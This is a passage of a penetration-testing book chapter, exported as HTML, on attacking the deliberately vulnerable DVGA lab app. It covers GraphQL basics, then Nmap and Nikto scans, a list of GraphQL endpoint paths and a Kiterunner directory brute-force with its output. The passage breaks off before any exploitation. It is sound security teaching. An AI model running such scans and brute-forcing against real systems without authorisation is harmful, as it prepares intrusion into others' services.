<html><head><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">.lst-kix_42b01d4435yz-5>li:before{content:"" counter(lst-ctn-kix_42b01d4435yz-5,lower-roman) ". "}.lst-kix_42b01d4435yz-2>li{counter-increment:lst-ctn-kix_42b01d4435yz-2}.lst-kix_42b01d4435yz-4>li:before{content:"" counter(lst-ctn-kix_42b01d4435yz-4,lower-latin) ". "}.lst-kix_42b01d4435yz-6>li:before{content:"" counter(lst-ctn-kix_42b01d4435yz-6,decimal) ". "}.lst-kix_42b01d4435yz-3>li:before{content:"" counter(lst-ctn-kix_42b01d4435yz-3,decimal) ". "}.lst-kix_42b01d4435yz-5>li{counter-increment:lst-ctn-kix_42b01d4435yz-5}.lst-kix_42b01d4435yz-7>li:before{content:"" counter(lst-ctn-kix_42b01d4435yz-7,lower-latin) ". "}ol.lst-kix_42b01d4435yz-4.start{counter-reset:lst-ctn-kix_42b01d4435yz-4 0}ol.lst-kix_42b01d4435yz-0.start{counter-reset:lst-ctn-kix_42b01d4435yz-0 0}ol.lst-kix_42b01d4435yz-5.start{counter-reset:lst-ctn-kix_42b01d4435yz-5 0}.lst-kix_42b01d4435yz-1>li:before{content:"" counter(lst-ctn-kix_42b01d4435yz-1,lower-latin) ". "}.lst-kix_42b01d4435yz-3>li{counter-increment:lst-ctn-kix_42b01d4435yz-3}ol.lst-kix_42b01d4435yz-8{list-style-type:none}.lst-kix_42b01d4435yz-0>li{counter-increment:lst-ctn-kix_42b01d4435yz-0}ol.lst-kix_42b01d4435yz-7{list-style-type:none}.lst-kix_42b01d4435yz-0>li:before{content:"" counter(lst-ctn-kix_42b01d4435yz-0,decimal) ". "}.lst-kix_42b01d4435yz-2>li:before{content:"" counter(lst-ctn-kix_42b01d4435yz-2,lower-roman) ". "}ol.lst-kix_42b01d4435yz-6{list-style-type:none}.lst-kix_42b01d4435yz-6>li{counter-increment:lst-ctn-kix_42b01d4435yz-6}ol.lst-kix_42b01d4435yz-5{list-style-type:none}ol.lst-kix_42b01d4435yz-7.start{counter-reset:lst-ctn-kix_42b01d4435yz-7 0}ol.lst-kix_42b01d4435yz-2.start{counter-reset:lst-ctn-kix_42b01d4435yz-2 0}ol.lst-kix_42b01d4435yz-0{list-style-type:none}ol.lst-kix_42b01d4435yz-8.start{counter-reset:lst-ctn-kix_42b01d4435yz-8 0}ol.lst-kix_42b01d4435yz-4{list-style-type:none}ol.lst-kix_42b01d4435yz-3{list-style-type:none}ol.lst-kix_42b01d4435yz-2{list-style-type:none}ol.lst-kix_42b01d4435yz-1{list-style-type:none}ol.lst-kix_42b01d4435yz-3.start{counter-reset:lst-ctn-kix_42b01d4435yz-3 0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_42b01d4435yz-7>li{counter-increment:lst-ctn-kix_42b01d4435yz-7}.lst-kix_42b01d4435yz-4>li{counter-increment:lst-ctn-kix_42b01d4435yz-4}ol.lst-kix_42b01d4435yz-6.start{counter-reset:lst-ctn-kix_42b01d4435yz-6 0}.lst-kix_42b01d4435yz-1>li{counter-increment:lst-ctn-kix_42b01d4435yz-1}ol.lst-kix_42b01d4435yz-1.start{counter-reset:lst-ctn-kix_42b01d4435yz-1 0}.lst-kix_42b01d4435yz-8>li:before{content:"" counter(lst-ctn-kix_42b01d4435yz-8,lower-roman) ". "}.lst-kix_42b01d4435yz-8>li{counter-increment:lst-ctn-kix_42b01d4435yz-8}ol{margin:0;padding:0}table td,table th{padding:0}.c9{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.75;border-left-width:0pt;border-top-style:solid;background-color:#ffffff;text-indent:12pt;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c21{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.5;border-left-width:0pt;border-top-style:solid;background-color:#ffffff;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c24{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.75;border-left-width:0pt;border-top-style:solid;background-color:#ffffff;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c18{border-right-style:solid;padding-top:6pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.125;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c31{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.5;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c8{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.75;border-top-style:solid;background-color:#ffffff;margin-left:54pt;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c1{background-color:#ffffff;-webkit-text-decoration-skip:none;color:#d3002d;font-weight:400;text-decoration:underline;text-decoration-skip-ink:none;font-size:9pt;font-family:"Times New Roman";font-style:italic}.c13{background-color:#ffffff;color:#3d3b49;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:9pt;font-family:"Times New Roman";font-style:italic}.c20{-webkit-text-decoration-skip:none;color:#d3002d;font-weight:400;text-decoration:underline;text-decoration-skip-ink:none;font-size:12pt;font-family:"Times New Roman"}.c5{color:#3d3b49;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:14.5pt;font-family:"Times New Roman";font-style:normal}.c2{color:#3d3b49;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:12pt;font-family:"Times New Roman";font-style:normal}.c10{padding-top:18pt;padding-bottom:18pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c19{padding-top:24pt;padding-bottom:24pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c4{background-color:#eef2f6;font-size:12pt;font-family:"Courier New";color:#3d3b49;font-weight:700}.c12{background-color:#eef2f6;font-size:12pt;font-family:"Courier New";color:#188038;font-weight:400}.c6{background-color:#eef2f6;font-size:12pt;font-family:"Courier New";color:#3d3b49;font-weight:400}.c29{background-color:#ffffff;color:#3d3b49;font-weight:700;font-size:40.5pt;font-family:"Times New Roman"}.c22{background-color:#eef2f6;color:#188038;font-weight:400;font-size:9pt;font-family:"Courier New"}.c26{background-color:#ffffff;color:#3d3b49;font-weight:400;font-size:9pt;font-family:"Times New Roman"}.c25{background-color:#ffffff;color:#3d3b49;font-weight:700;font-size:54pt;font-family:"Times New Roman"}.c15{font-size:12pt;font-family:"Times New Roman";color:#3d3b49;font-weight:700}.c7{font-size:12pt;font-family:"Times New Roman";color:#3d3b49;font-weight:400}.c23{color:#3d3b49;font-weight:700;font-size:23.5pt;font-family:"Times New Roman"}.c30{color:#000000;font-weight:400;font-size:11pt;font-family:"Arial"}.c28{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c11{text-decoration:none;vertical-align:baseline;font-style:normal}.c16{text-decoration:none;vertical-align:baseline;font-style:italic}.c3{color:inherit;text-decoration:inherit}.c27{padding:0;margin:0}.c17{font-style:italic}.c14{height:11pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c28 doc-content"><h1 class="c31" id="h.40daromin502"><span class="c11 c25">14</span></h1><h1 class="c31" id="h.40daromin502-1"><span class="c29 c11">ATTACKING GRAPHQL</span></h1><p class="c19"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 610.67px; height: 800.00px;"><img alt="" src="images/image14.png" style="width: 610.67px; height: 800.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c24"><span class="c2">This chapter will guide you through the process of attacking the Damn Vulnerable GraphQL Application (DVGA) using the API hacking techniques we&rsquo;ve covered so far. We&rsquo;ll begin with active reconnaissance, transition to API analysis, and conclude by attempting various attacks against the application.</span></p><p class="c9"><span class="c2">As you&rsquo;ll see, there are some major differences between the RESTful APIs we&rsquo;ve been working with throughout this book and GraphQL APIs. I will guide you through these differences and demonstrate how we can leverage the same hacking techniques by adapting them to GraphQL. In the process, you&rsquo;ll get a sense of how you might apply your new skills to emerging web API formats.</span></p><p class="c9"><span class="c2">You should treat this chapter as a hands-on lab. If you would like to follow along, make sure your hacking lab includes DVGA. For more information regarding setting up DVGA, return to Chapter 5.</span></p><h2 class="c21" id="h.h9hhnxrvo6bk"><span class="c23 c11">GraphQL Requests and IDEs</span></h2><p class="c24"><span class="c7">In Chapter 2, we covered some of the basics of how GraphQL works. In this section, we&rsquo;ll discuss how to use and attack GraphQL. As you proceed, remember that GraphQL more closely resembles SQL than REST APIs. Because GraphQL is a query language, using it is really just querying a database with more steps. Let&rsquo;s look the request in </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23listing14-1&amp;sa=D&amp;source=editors&amp;ust=1681144520636033&amp;usg=AOvVaw3_RkwEGmMT9RFwy2PyOEHO">Listing 14-1</a></span><span class="c7">&nbsp;and its response in </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23listing14-2&amp;sa=D&amp;source=editors&amp;ust=1681144520636481&amp;usg=AOvVaw1n-4pSLGTXMWXR8okcvWM_">Listing 14-2</a></span><span class="c2">.</span></p><p class="c0 c14"><span class="c6 c11"></span></p><p class="c0"><span class="c6 c11">POST /v1/graphql</span></p><p class="c0"><span class="c6 c11">--snip--</span></p><p class="c0"><span class="c6 c11">query products (price: &quot;10.00&quot;) {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp;name</span></p><p class="c0"><span class="c6 c11">price</span></p><p class="c10"><span class="c6 c11">}</span></p><p class="c24"><span class="c20 c17">Listing 14-1</span><span class="c7 c16">: A GraphQL request</span></p><p class="c0 c14"><span class="c6 c11"></span></p><p class="c0"><span class="c6 c11">200 OK</span></p><p class="c0"><span class="c6 c11">{</span></p><p class="c0"><span class="c6 c11">&quot;data&quot;: {</span></p><p class="c0"><span class="c6 c11">&quot;products&quot;: [</span></p><p class="c0"><span class="c6 c11">{</span></p><p class="c0"><span class="c6 c11">&quot;product_name&quot;: &quot;Seat&quot;,</span></p><p class="c0"><span class="c6 c11">&quot;price&quot;: &quot;10.00&quot;,</span></p><p class="c0"><span class="c6 c11">&quot;product_name&quot;: &quot;Wheel&quot;,</span></p><p class="c0"><span class="c6 c11">&quot;price&quot;: &quot;10.00&quot;</span></p><p class="c10"><span class="c6 c11">}]}</span></p><p class="c24"><span class="c20 c17">Listing 14-2</span><span class="c7 c16">: A GraphQL response</span></p><p class="c9"><span class="c2">Unlike REST APIs, GraphQL APIs don&rsquo;t use a variety of endpoints to represent where resources are located. Instead, all requests use POST and get sent to a single endpoint. The request body will contain the query and mutation, along with the requested types.</span></p><p class="c9"><span class="c7">Remember from Chapter 2 that the GraphQL </span><span class="c7 c17">schema</span><span class="c7">&nbsp;is the shape in which the data is organized. The schema consists of types and fields. The </span><span class="c7 c17">types</span><span class="c7">&nbsp;(</span><span class="c12">query</span><span class="c7">, </span><span class="c12">mutation</span><span class="c7">, and</span><span class="c15">&nbsp;</span><span class="c12">subscription</span><span class="c7">) are the basic methods consumers can use to interact with GraphQL. While REST APIs use the HTTP request methods GET, POST, PUT, and DELETE to implement CRUD (create, read, update, delete) functionality, GraphQL instead uses </span><span class="c12">query</span><span class="c7">&nbsp;(to read) and </span><span class="c12">mutation</span><span class="c7">&nbsp;(to create, update, and delete). We won&rsquo;t be using </span><span class="c12">subscription</span><span class="c2">&nbsp;in this chapter, but it is essentially a connection made to the GraphQL server that allows the consumer to receive real-time updates. You can actually build out a GraphQL request that performs both a query and mutation, allowing you to read and write in a single request.</span></p><p class="c9"><span class="c7 c17">Queries</span><span class="c7">&nbsp;begin with an object type. In our example, the object type is </span><span class="c12">products</span><span class="c7">. Object types contain one or more fields providing data about the object, such as </span><span class="c12">name</span><span class="c7">&nbsp;and </span><span class="c12">price</span><span class="c7">&nbsp;in our example. GraphQL queries can also contain arguments within parentheses, which help narrow down the fields you&rsquo;re looking for. For instance, the argument in our sample request specifies that the consumer only wants products that have the price </span><span class="c12">&quot;10.00&quot;</span><span class="c2">.</span></p><p class="c9"><span class="c2">As you can see, GraphQL responded to the successful query with the exact information requested. Many GraphQL APIs will respond to all requests with an HTTP 200 response, regardless of whether the query was successful. Whereas you would receive a variety of error response codes with a REST API, GraphQL will often send a 200 response and include the error within the response body.</span></p><p class="c9"><span class="c2">Another major difference between REST and GraphQL is that it is fairly common for GraphQL providers to make an integrated development environment (IDE) available over their web application. A GraphQL IDE is a graphical interface that can be used to interact with the API. Some of the most common GraphQL IDEs are GraphiQL, GraphQL Playground, and the Altair Client. These GraphQL IDEs consist of a window to craft queries, a window to submit requests, a window for responses, and a way to reference the GraphQL documentation.</span></p><p class="c9"><span class="c7">Later in this chapter, we will cover enumerating GraphQL with queries and mutations. For more information about GraphQL, check out the GraphQL guide at </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://graphql.org/learn&amp;sa=D&amp;source=editors&amp;ust=1681144520640899&amp;usg=AOvVaw1X-98Bq0R1z1duKF536BQv">https://graphql.org/learn</a></span><span class="c2">&nbsp;and the additional resources provided by Dolev Farhi in the DVGA GitHub Repo.</span></p><h2 class="c21" id="h.bfpvs8xaxot2"><span class="c23 c11">Active Reconnaissance</span></h2><p class="c24"><span class="c2">Let&rsquo;s begin by actively scanning DVGA for any information we can gather about it. If you were trying to uncover an organization&rsquo;s attack surface rather than attacking a deliberately vulnerable application, you might begin with passive reconnaissance instead.</span></p><h3 class="c21" id="h.c1uxibcq1074"><span class="c5">Scanning</span></h3><p class="c24"><span class="c2">Use an Nmap scan to learn about the target host. From the following scan, we can see that port 5000 is open, has HTTP running on it, and uses a web application library called Werkzeug version 1.0.1:</span></p><p class="c0"><span class="c6">$ </span><span class="c4">nmap -sC -sV 192.168.195.132</span></p><p class="c0"><span class="c6 c11">Starting Nmap 7.91 ( https://nmap.org ) at 10-04 08:13 PDT</span></p><p class="c0"><span class="c6 c11">Nmap scan report for 192.168.195.132</span></p><p class="c0"><span class="c6 c11">Host is up (0.00046s latency).</span></p><p class="c0"><span class="c6 c11">Not shown: 999 closed ports</span></p><p class="c0"><span class="c6 c11">PORT &nbsp; &nbsp; &nbsp;STATE &nbsp; &nbsp;SERVICE &nbsp; &nbsp;VERSION</span></p><p class="c0"><span class="c4">5000/tcp open &nbsp; </span><span class="c6">&nbsp; </span><span class="c4">http &nbsp; &nbsp;</span><span class="c6">&nbsp;</span><span class="c4">Werkzeug httpd 1.0.1 (Python 3.7.12)</span></p><p class="c0"><span class="c4">|_http-server-header: Werkzeug/1.0.1 Python/3.7.12</span></p><p class="c10"><span class="c4 c11">|_http-title: Damn Vulnerable GraphQL Application</span></p><p class="c9"><span class="c7">The most important piece of information here is found in the </span><span class="c12">http-title</span><span class="c2">, which gives us a hint that we&rsquo;re working with a GraphQL application. You won&rsquo;t typically find indications like this in the wild, so we will ignore it for now. You might follow this scan with an all-ports scan to search for additional information.</span></p><p class="c9"><span class="c2">Now it&rsquo;s time to perform more targeted scans. Let&rsquo;s run a quick web application vulnerability scan using Nikto, making sure to specify that the web application is operating over port 5000:</span></p><p class="c0"><span class="c6">$ </span><span class="c4">nikto -h 192.168.195.132:5000</span></p><p class="c0"><span class="c6 c11">---------------------------------------------------------------------------</span></p><p class="c0"><span class="c6 c11">+ Target IP: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;192.168.195.132</span></p><p class="c0"><span class="c6 c11">+ Target Hostname: &nbsp; &nbsp;192.168.195.132</span></p><p class="c0"><span class="c6 c11">+ Target Port: &nbsp; &nbsp; &nbsp; &nbsp;5000</span></p><p class="c0"><span class="c6 c11">---------------------------------------------------------------------------</span></p><p class="c0"><span class="c6 c11">+ Server: Werkzeug/1.0.1 Python/3.7.12</span></p><p class="c0"><span class="c6 c11">+ Cookie env created without the httponly flag</span></p><p class="c0"><span class="c6 c11">+ The anti-clickjacking X-Frame-Options header is not present.</span></p><p class="c0"><span class="c6 c11">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span></p><p class="c0"><span class="c6 c11">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span></p><p class="c0"><span class="c6 c11">+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)</span></p><p class="c0"><span class="c6 c11">+ Server may leak inodes via ETags, header found with file /static/favicon.ico, inode: 1633359027.0, size: 15406, mtime: 2525694601</span></p><p class="c0"><span class="c6 c11">+ Allowed HTTP Methods: OPTIONS, HEAD, GET</span></p><p class="c0"><span class="c6 c11">+ 7918 requests: 0 error(s) and 6 item(s) reported on remote host</span></p><p class="c0"><span class="c6 c11">---------------------------------------------------------------------------</span></p><p class="c10"><span class="c6 c11">+ 1 host(s) tested</span></p><p class="c9"><span class="c7">Nikto tells us that the application may have some security misconfigurations, such as the missing </span><span class="c12">X-Frame-Options</span><span class="c7">&nbsp;and undefined </span><span class="c12">X-XSS-Protection</span><span class="c2">&nbsp;headers. In addition, we&rsquo;ve found that the OPTIONS, HEAD, and GET methods are allowed. Since Nikto did not pick up any interesting directories, we should check out the web application in a browser and see what we can find as an end user. Once we have thoroughly explored the web app, we can perform a directory brute-force attack to see if we can find any other directories.</span></p><h3 class="c21" id="h.s11btcosrn53"><span class="c5">Viewing DVGA in a Browser</span></h3><p class="c24"><span class="c7">As you can see in </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-1&amp;sa=D&amp;source=editors&amp;ust=1681144520647469&amp;usg=AOvVaw37z-xDTR-F0OsN3yePhmUs">Figure 14-1</a></span><span class="c2">, the DVGA web page describes a deliberately vulnerable GraphQL application.</span></p><p class="c9"><span class="c7">Make sure to use the site as any other user would by clicking the links located on the web page. Explore the Private Pastes, Public Pastes, Create Paste, Import Paste, and Upload Paste links. In the process, you should begin to see a few interesting items, such as usernames, forum posts that include IP addresses and </span><span class="c12">user-agent</span><span class="c2">&nbsp;info, a link for uploading files, and a link for creating forum posts. Already we have a bundle of information that could prove useful in our upcoming attacks.</span></p><p class="c19"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 334.67px;"><img alt="Screenshot of the Damn Vulnerable GraphQL Application homepage. Shows welcome and getting started messages. A sidebar shows tabs for Home, Private Pastes, and Public Pastes." src="images/image13.png" style="width: 624.00px; height: 334.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c1">Figure 14-1</span><span class="c13">: The DVGA landing page</span></p><h3 class="c21" id="h.99182or6tu6c"><span class="c5">Using DevTools</span></h3><p class="c24"><span class="c7">Now that we&rsquo;ve explored the site as an average user, let&rsquo;s take a peek under the hood of the web application using DevTools. To see the different resources involved in this web application, navigate to the DVGA home page and open the Network module in DevTools. Refresh the Network module by pressing CTRL-R. You should see something like the interface shown in </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-2&amp;sa=D&amp;source=editors&amp;ust=1681144520648981&amp;usg=AOvVaw1gd51-zqAgc4y-W1GVO_BW">Figure 14-2</a></span><span class="c2">.</span></p><p class="c19"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 513.33px;"><img alt="Screenshot of the DevTools Network tab with a list of the headers sent in a request to the DVGA home page. The header &ldquo;Set-Cookie: env=graphiql:disable; Path=/&rdquo; is highlighted." src="images/image8.png" style="width: 624.00px; height: 513.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c1">Figure 14-2</span><span class="c13">: The DVGA home page&rsquo;s network source file</span></p><p class="c9"><span class="c7">Look through the response headers of the primary resource. You should see the header </span><span class="c12">Set-Cookie: env=graphiql:disable</span><span class="c2">, another indication that we&rsquo;re interacting with a target that uses GraphQL. Later, we may be able to manipulate a cookie like this one to enable a GraphQL IDE called GraphiQL.</span></p><p class="c9"><span class="c7">Back in your browser, navigate to the Public Pastes page, open up the DevTools Network module, and refresh again (see </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-3&amp;sa=D&amp;source=editors&amp;ust=1681144520650780&amp;usg=AOvVaw1EC8rP-BvLLRmKHTeqvBcD">Figure 14-3</a></span><span class="c2">).</span></p><p class="c19"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 282.67px;"><img alt="Screenshot of the DevTools Network tab set to the Preview menu. Shows the source code for the DVGA Public Pastes page." src="images/image3.png" style="width: 624.00px; height: 282.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c1">Figure 14-3</span><span class="c13">: DVGA public_pastes source</span></p><p class="c9"><span class="c7">There is a new source file called </span><span class="c7 c17">graphql</span><span class="c2">. Select this source and choose the Preview tab. Now you will see a preview of the response for this resource. GraphQL, like REST, uses JSON as the syntax for transferring data. At this point, you may have guessed that this is a response generated using GraphQL.</span></p><h2 class="c21" id="h.f6q1gp6t4lxh"><span class="c23 c11">Reverse Engineering the GraphQL API</span></h2><p class="c24"><span class="c2">Now that we know the target app uses GraphQL, let&rsquo;s try to determine the API&rsquo;s endpoint and requests. Unlike REST APIs, whose resources are available at various endpoints, a host that uses GraphQL relies on only a single endpoint for its API. In order to interact with the GraphQL API, we must first find this endpoint and then figure out what we can query for.</span></p><h3 class="c21" id="h.o34ht2l73zkn"><span class="c5">Directory Brute-Forcing for the GraphQL Endpoint</span></h3><p class="c24"><span class="c2">A directory brute-force scan using Gobuster or Kiterunner can tell us if there are any GraphQL-related directories. Let&rsquo;s use Kiterunner to find these. If you were searching for GraphQL directories manually, you could add keywords like the following in the requested path:</span></p><ol class="c27 lst-kix_42b01d4435yz-0 start" start="1"><li class="c8 li-bullet-0"><span class="c7 c16">/graphql</span></li><li class="c8 li-bullet-0"><span class="c7 c16">/v1/graphql</span></li><li class="c8 li-bullet-0"><span class="c7 c16">/api/graphql</span></li><li class="c8 li-bullet-0"><span class="c7 c16">/v1/api/graphql</span></li><li class="c8 li-bullet-0"><span class="c7 c16">/graph</span></li><li class="c8 li-bullet-0"><span class="c7 c16">/v1/graph</span></li><li class="c8 li-bullet-0"><span class="c7 c16">/graphiql</span></li><li class="c8 li-bullet-0"><span class="c7 c16">/v1/graphiql</span></li><li class="c8 li-bullet-0"><span class="c7 c16">/console</span></li><li class="c8 li-bullet-0"><span class="c7 c16">/query</span></li><li class="c8 li-bullet-0"><span class="c7 c16">/graphql/console</span></li><li class="c8 li-bullet-0"><span class="c7 c16">/altair</span></li><li class="c8 li-bullet-0"><span class="c7 c16">/playground</span></li></ol><p class="c9"><span class="c7">Of course, you should also try replacing the version numbers in any of these paths with </span><span class="c7 c17">/v2</span><span class="c7">, </span><span class="c7 c17">/v3</span><span class="c7">, </span><span class="c7 c17">/test</span><span class="c7">,</span><span class="c7 c17">&nbsp;/internal</span><span class="c7">, </span><span class="c7 c17">/mobile</span><span class="c7">, </span><span class="c7 c17">/legacy</span><span class="c2">, or any variation of these paths. For example, both Altair and Playground are alternative IDEs to GraphiQL that you could search for with various versioning in the path.</span></p><p class="c9"><span class="c2">SecLists can also help us automate this directory search:</span></p><p class="c0"><span class="c6">$ </span><span class="c4">kr brute http://192.168.195.132:5000 -w /usr/share/seclists/Discovery/Web-Content/graphql.txt</span></p><p class="c0 c14"><span class="c6 c11"></span></p><p class="c0"><span class="c6 c11">GET &nbsp; &nbsp; 400 [ &nbsp; &nbsp; 53, &nbsp; &nbsp;4, &nbsp; 1] http://192.168.195.132:5000/graphiql</span></p><p class="c0 c14"><span class="c6 c11"></span></p><p class="c0"><span class="c6 c11">GET &nbsp; &nbsp; 400 [ &nbsp; &nbsp; 53, &nbsp; &nbsp;4, &nbsp; 1] http://192.168.195.132:5000/graphql</span></p><p class="c0 c14"><span class="c6 c11"></span></p><p class="c10"><span class="c6 c11">5:50PM INF scan complete duration=716.265267 results=2</span></p><p class="c9"><span class="c7">We receive two relevant results from this scan; however, both currently respond with an HTTP 400 Bad Request status code. Let&rsquo;s check them in the web browser. The </span><span class="c7 c17">/graphql</span><span class="c7">&nbsp;path resolves to a JSON response page with the message </span><span class="c12">&quot;Must provide query string.&quot;</span><span class="c7">&nbsp;(see </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-4&amp;sa=D&amp;source=editors&amp;ust=1681144520658068&amp;usg=AOvVaw0mnwYRdfFhuaj7eUwMx_qB">Figure 14-4</a></span><span class="c2">).</span></p><p class="c19"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 558.67px; height: 294.67px;"><img alt="Screenshot of the /graphql path of the DVGA app. Shows the JSON message &ldquo;Must provide query string.&rdquo;" src="images/image4.png" style="width: 558.67px; height: 294.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c1">Figure 14-4</span><span class="c13">: The DVGA /graphql path</span></p><p class="c9"><span class="c7">This doesn&rsquo;t give us much to work with, so let&rsquo;s check out the </span><span class="c7 c17">/graphiql </span><span class="c7">endpoint. As you can see in </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-5&amp;sa=D&amp;source=editors&amp;ust=1681144520659543&amp;usg=AOvVaw3FrsZJ-jnnm8z2-WjYKSWe">Figure 14-5</a></span><span class="c7">, the </span><span class="c7 c17">/graphiql</span><span class="c2">&nbsp;path leads us to the web IDE often used for GraphQL, GraphiQL.</span></p><p class="c19"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 324.00px;"><img alt="Screenshot of the /graphiql page of the DVGA app. Shows a GraphiQL IDE." src="images/image6.png" style="width: 624.00px; height: 324.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c1">Figure 14-5</span><span class="c13">: The DVGA GraphiQL web IDE</span></p><p class="c9"><span class="c7">However, we are met with the message </span><span class="c12">&quot;400 Bad Request: GraphiQL Access Rejected&quot;</span><span class="c2">.</span></p><p class="c9"><span class="c7">In the GraphiQL web IDE, the 